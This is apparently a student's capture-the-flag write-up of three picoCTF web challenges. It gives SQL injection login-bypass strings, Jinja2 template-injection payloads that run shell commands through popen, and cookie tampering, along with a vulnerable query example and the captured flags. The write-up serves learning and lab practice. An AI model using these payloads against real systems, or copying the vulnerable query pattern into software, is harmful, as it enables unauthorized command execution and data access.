# 1. Web gauntlet

>Can you beat the filters?
Log in as admin http://shape-facility.picoctf.net:56760/ http://shape-facility.picoctf.net:56760/filter.php
## Solution:

- Sql injection wrt filters
- admin'/* worked for most of them
- and concatenating the strings for last 2 worked like:
  ad'||'min'/* or a'||'dmin'/*

## Concepts learnt:

- SQL injection
 - SQL injection is a vulnerability that occurs when an application incorporates user input directly into SQL queries without proper sanitization. 

- I mean i got the idea but this was hard to relate so i sort of learned using an example i got from my goat claude

```sql
# VULNERABLE - Never do this!
username = request.get('username')
password = request.get('password')

query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
result = db.execute(query)
```
- So yeah , Here commenting out works , we comment out the password field so anypassword and UwU

- Common sql techniques
## Notes:
- Opened up an sql cheat sheet and just started using random injections
the OR ones UNION and time dependent ones

# 2. SSTI

> I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!

## Solution:

- Detecting the template engine
- Testing the waters using the following payloads

```

{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}

```
- The first one worked so its a Jinja2  SSTI (nope had 0 idea about different templates 100% AI)
- Checking config
 ```python
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('ls').read()}}

```
Output 
```__pycache__ app.py flag requirements.txt
```
- Reading the flag
```python
{{cycler.__init__.__globals__.os.popen('cat flag').read()}}
```
- The flag pops up.
## Flag:

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}
```

## Concepts learnt:
- Template engine : template engines generate HTML by combining templates with data
 - Template engines , their languages and syntax
 - Exploring config and finding files

 - Why this works (Claude taught me ts)
  - Python objects have special attributes like __globals__
   - These give access to the Python runtime
     - From there, we can import modules and execute code
     - Reading the flag ({{cycler.__init__.__globals__.os.popen('cat flag').read()}}):
 - learning common SSTI playloads
 ```
 cycler: Built-in Jinja2 utility
__init__: Constructor method
__globals__: Access global namespace
os: Operating system module
popen('id'): Execute 'id' command
.read(): Get command output
 ```

## Notes:
T__T heavily used AI to learn SSTI

# 3. Cookies

> Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:29649/

## Solution:

- Inspect element > Application > Cookies
- name value: -1
- The cookie value changes with every cookie name entered
- Manually changing the cookie value and sifting through the numbers to get the cookie 
- Found flag at value = 18

## Flag:

```
picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}
```

## Concepts learnt:

- Cookies
 - Cookies are small pieces of data that websites store in our browser.
 - Used to remember information between pages
- Why cookies exist? 
 - Working of cookies
- Attributes of a cookie
```
Set-Cookie: session=xyz789; 
            Domain=.example.com; 
            Path=/; 
            Expires=Wed, 09 Jun 2026 10:18:14 GMT; 
            Max-Age=3600; 
            Secure; 
            HttpOnly; 
            SameSite=Strict

```
- Type of cookies in web apps
 - session cookies
 - JWT tokens
 - Preference cookies
 - Tracking cookies
- Cookie vulnerabilities <refer claude (for myself)>
- Exploiting cookies using Developer tools
